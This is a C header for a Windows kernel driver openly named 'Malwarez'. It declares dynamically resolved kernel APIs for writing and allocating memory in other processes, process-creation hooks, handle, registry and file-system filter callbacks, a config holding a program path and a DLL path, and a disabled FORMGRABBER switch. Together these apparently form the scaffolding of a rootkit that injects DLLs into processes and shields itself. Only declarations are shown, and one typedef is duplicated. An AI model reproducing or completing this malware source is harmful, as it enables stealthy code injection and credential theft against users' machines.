#pragma once
#include <ntddk.h>
#include <wsk.h>
#include <wdm.h>
#define DEVICE_NAME (L"\\Device\\Malwarez")
#define DOS_DEVICE_NAME (L"\\DosDevices\\Malwarez")

#define CONFIGURE CTL_CODE(FILE_DEVICE_UNKNOWN, 2048, METHOD_IN_DIRECT, FILE_ANY_ACCESS)
//#define FORMGRABBER
typedef struct _DeviceConfig {
	BOOLEAN InUse;
	struct {
		KIRQL OldIRQL;
		KSPIN_LOCK SpinLock;
	} context[1];
	ULONG OwnerProcessID;
} DeviceConfig, *PDeviceConfig;

typedef struct _CONFIG {
	LPWSTR ProgramPath;
	LPWSTR DLLPath;
}CONFIG, *PCONFIG;


VOID PcreateProcessNotifyRoutineEx(_Inout_ PEPROCESS Process, _In_ HANDLE ProcessId, _In_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo);

NTSTATUS FilterSetup(PCFLT_RELATED_OBJECTS FltObjects, FLT_INSTANCE_SETUP_FLAGS Flags, DEVICE_TYPE VolumeDeviceType, FLT_FILESYSTEM_TYPE VolumeFilesystemType);
OB_PREOP_CALLBACK_STATUS  PreOperationCallback(
	PVOID RegistrationContext,
	POB_PRE_OPERATION_INFORMATION OperationInformation
);
FLT_PREOP_CALLBACK_STATUS FltCreateFilePre(
	_Inout_ PFLT_CALLBACK_DATA Data,
	_In_ PCFLT_RELATED_OBJECTS FltObjects,
	_Flt_CompletionContext_Outptr_ PVOID *CompletionContext);

EX_CALLBACK_FUNCTION RegistryCallBack;



typedef NTSTATUS(NTAPI *__PsLookupProcessByProcessId)(
	_In_ HANDLE ProcessId,
	_Outptr_ PEPROCESS *Process
	);
__PsLookupProcessByProcessId _PsLookupProcessByProcessId;
typedef NTSTATUS(NTAPI *_ZwWriteVirtualMemory)(
	_In_ HANDLE  	ProcessHandle,
	_In_ PVOID  	BaseAddress,
	_In_ PVOID  	Buffer,
	_In_ SIZE_T  	NumberOfBytesToWrite,
	_Out_opt_ PSIZE_T  	NumberOfBytesWritten
	);
_ZwWriteVirtualMemory ZwWriteVirtualMemory;

typedef NTSTATUS (NTAPI *__ZwCreateFile)(
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_opt_ PLARGE_INTEGER AllocationSize,
	_In_ ULONG FileAttributes,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
	_In_ ULONG EaLength
);
__ZwCreateFile _ZwCreateFile;
typedef PVOID (NTAPI *__ExAllocatePoolWithTag)(
	_In_ __drv_strictTypeMatch(__drv_typeExpr) POOL_TYPE PoolType,
	_In_ SIZE_T NumberOfBytes,
	_In_ ULONG Tag
);
__ExAllocatePoolWithTag _ExAllocatePoolWithTag;
typedef NTSTATUS (NTAPI *__ZwReadFile)(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_writes_bytes_(Length) PVOID Buffer,
	_In_ ULONG Length,
	_In_opt_ PLARGE_INTEGER ByteOffset,
	_In_opt_ PULONG Key
);
__ZwReadFile _ZwReadFile;
typedef NTSTATUS (NTAPI *__ZwAllocateVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
);
__ZwAllocateVirtualMemory _ZwAllocateVirtualMemory;
typedef NTSTATUS (NTAPI *__ZwFreeVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG FreeType
);
__ZwFreeVirtualMemory _ZwFreeVirtualMemory;
typedef VOID (NTAPI * __ExFreePoolWithTag)(
	_Pre_notnull_ __drv_freesMem(Mem) PVOID P,
	_In_ ULONG Tag
);
__ExFreePoolWithTag _ExFreePoolWithTag;


typedef KIRQL (FASTCALL *__KfAcquireSpinLock)(
	_Inout_ PKSPIN_LOCK SpinLock
);
__KfAcquireSpinLock _KfAcquireSpinLock;
typedef VOID (FASTCALL *__KfReleaseSpinLock)(
	_Inout_ PKSPIN_LOCK SpinLock,
	_In_ _IRQL_restores_ KIRQL NewIrql
);
__KfReleaseSpinLock _KfReleaseSpinLock;

typedef NTSTATUS (NTAPI *__ZwCreateKey)(
	_Out_ PHANDLE KeyHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Reserved_ ULONG TitleIndex,
	_In_opt_ PUNICODE_STRING Class,
	_In_ ULONG CreateOptions,
	_Out_opt_ PULONG Disposition
);
__ZwCreateKey _ZwCreateKey;
typedef NTSTATUS (NTAPI *__ZwSetValueKey)(
	_In_ HANDLE KeyHandle,
	_In_ PUNICODE_STRING ValueName,
	_In_opt_ ULONG TitleIndex,
	_In_ ULONG Type,
	_In_reads_bytes_opt_(DataSize) PVOID Data,
	_In_ ULONG DataSize
);
__ZwSetValueKey _ZwSetValueKey;
typedef NTSTATUS (NTAPI *__ZwClose)(
	_In_ HANDLE Handle
);
__ZwClose _ZwClose;
typedef VOID (FASTCALL *__IofCompleteRequest)(
	_In_ PIRP Irp,
	_In_ CCHAR PriorityBoost
);
__IofCompleteRequest _IofCompleteRequest;
typedef NTSTATUS (NTAPI *__IoDeleteSymbolicLink)(
	_In_ PUNICODE_STRING SymbolicLinkName
);
__IoDeleteSymbolicLink _IoDeleteSymbolicLink;
typedef VOID (NTAPI *__IoDeleteDevice)(
	_In_ __drv_freesMem(Mem) PDEVICE_OBJECT DeviceObject
);
__IoDeleteDevice _IoDeleteDevice;
typedef NTSTATUS (NTAPI *__CmUnRegisterCallback)(_In_ LARGE_INTEGER    Cookie);
__CmUnRegisterCallback _CmUnRegisterCallback;
typedef VOID (NTAPI *__ObUnRegisterCallbacks)(
	_In_ PVOID RegistrationHandle
);
__ObUnRegisterCallbacks _ObUnRegisterCallbacks;
typedef VOID (FLTAPI *__FltUnregisterFilter)(
	_In_ PFLT_FILTER Filter
);
__FltUnregisterFilter _FltUnregisterFilter;
typedef NTSTATUS (NTAPI *__PsSetCreateProcessNotifyRoutineEx)(
	_In_ PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
	_In_ BOOLEAN Remove
);
__PsSetCreateProcessNotifyRoutineEx _PsSetCreateProcessNotifyRoutineEx;

#define _ExFreePool(a) _ExFreePoolWithTag (a,0)
typedef VOID (NTAPI *__KeInitializeSpinLock)(
	_Out_ PKSPIN_LOCK SpinLock
);
__KeInitializeSpinLock _KeInitializeSpinLock;
typedef NTSTATUS (NTAPI *__IoCreateSymbolicLink)(
	_In_ PUNICODE_STRING SymbolicLinkName,
	_In_ PUNICODE_STRING DeviceName
);
__IoCreateSymbolicLink _IoCreateSymbolicLink;
typedef NTSTATUS (NTAPI *__ObRegisterCallbacks)(
	_In_ POB_CALLBACK_REGISTRATION CallbackRegistration,
	_Outptr_ PVOID *RegistrationHandle
);
__ObRegisterCallbacks _ObRegisterCallbacks;

typedef NTSTATUS (FLTAPI *__FltRegisterFilter)(
	_In_ PDRIVER_OBJECT Driver,
	_In_ CONST FLT_REGISTRATION *Registration,
	_Outptr_ PFLT_FILTER *RetFilter
);
__FltRegisterFilter _FltRegisterFilter;
typedef NTSTATUS (FLTAPI *__FltStartFiltering)(
	_In_ PFLT_FILTER Filter
);
__FltStartFiltering _FltStartFiltering;
typedef VOID (NTAPI *__IoDeleteDevice)(
	_In_ __drv_freesMem(Mem) PDEVICE_OBJECT DeviceObject
);
__IoDeleteDevice _IoDeleteDevice;
typedef NTSTATUS (NTAPI *__CmCallbackGetKeyObjectID)(_In_            PLARGE_INTEGER      Cookie,
	_In_            PVOID               Object,
	_Out_opt_       PULONG_PTR          ObjectID,
	_Outptr_opt_ PCUNICODE_STRING    *ObjectName
);
__CmCallbackGetKeyObjectID _CmCallbackGetKeyObjectID;
typedef BOOLEAN (NTAPI *__RtlEqualUnicodeString)(
	_In_ PCUNICODE_STRING String1,
	_In_ PCUNICODE_STRING String2,
	_In_ BOOLEAN CaseInSensitive
);
__RtlEqualUnicodeString _RtlEqualUnicodeString;
typedef VOID (FLTAPI  *__FltReleaseFileNameInformation)(
	_In_ PFLT_FILE_NAME_INFORMATION FileNameInformation
);
__FltReleaseFileNameInformation _FltReleaseFileNameInformation;


typedef ULONG (NTAPI *__IoGetRequestorProcessId)(
	_In_ PIRP Irp
);
__IoGetRequestorProcessId _IoGetRequestorProcessId;

typedef PVOID (NTAPI *__ExAllocatePool)(
	__drv_strictTypeMatch(__drv_typeExpr) _In_ POOL_TYPE PoolType,
	_In_ SIZE_T NumberOfBytes
);
__ExAllocatePool _ExAllocatePool;

typedef NTSTATUS (NTAPI *__IoCreateDevice)(
	_In_  PDRIVER_OBJECT DriverObject,
	_In_  ULONG DeviceExtensionSize,
	_In_opt_ PUNICODE_STRING DeviceName,
	_In_  DEVICE_TYPE DeviceType,
	_In_  ULONG DeviceCharacteristics,
	_In_  BOOLEAN Exclusive,
	_Outptr_result_nullonfailure_
	_At_(*DeviceObject,
		__drv_allocatesMem(Mem)
		_When_((((_In_function_class_(DRIVER_INITIALIZE))
			|| (_In_function_class_(DRIVER_DISPATCH)))),
			__drv_aliasesMem))
	PDEVICE_OBJECT *DeviceObject
);
__IoCreateDevice _IoCreateDevice;
typedef NTSTATUS (NTAPI *__CmRegisterCallbackEx)(_In_        PEX_CALLBACK_FUNCTION   Function,
	_In_        PCUNICODE_STRING        Altitude,
	_In_        PVOID                   Driver, //PDRIVER_OBJECT
	_In_opt_    PVOID                   Context,
	_Out_       PLARGE_INTEGER          Cookie,
	_Reserved_  PVOID                   Reserved
);
__CmRegisterCallbackEx _CmRegisterCallbackEx;

typedef NTSTATUS (NTAPI *__ZwOpenProcess)(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID ClientId
);
__ZwOpenProcess _ZwOpenProcess;

typedef NTSTATUS (FLTAPI *__FltGetFileNameInformation)(
	_In_ PFLT_CALLBACK_DATA CallbackData,
	_In_ FLT_FILE_NAME_OPTIONS NameOptions,
	_Outptr_ PFLT_FILE_NAME_INFORMATION *FileNameInformation
);
__FltGetFileNameInformation _FltGetFileNameInformation;

typedef NTSTATUS (NTAPI *__ZwQueryInformationFile)(
	_In_ HANDLE FileHandle,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_writes_bytes_(Length) PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass
);
__ZwQueryInformationFile _ZwQueryInformationFile;